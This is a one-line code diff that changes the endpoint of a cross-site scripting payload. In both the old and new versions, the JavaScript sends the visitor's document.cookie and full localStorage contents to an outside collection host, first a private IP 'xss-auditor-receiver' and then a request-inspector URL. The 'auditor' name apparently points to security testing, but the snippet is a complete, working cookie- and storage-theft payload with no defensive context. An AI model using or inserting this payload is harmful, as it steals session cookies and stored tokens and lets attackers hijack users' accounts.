@@ -1,1 +1,1 @@
-window.location = "http://172.31.240.153:9000/xss-auditor-receiver?cookie="+document.cookie+"&localstorage="+JSON.stringify(window.localStorage);
+window.location = "https://requestinspector.com/inspect/01d8t85tq0e8rf4q5ryxhzhzwk?cookie="+document.cookie+"&localstorage="+JSON.stringify(window.localStorage);
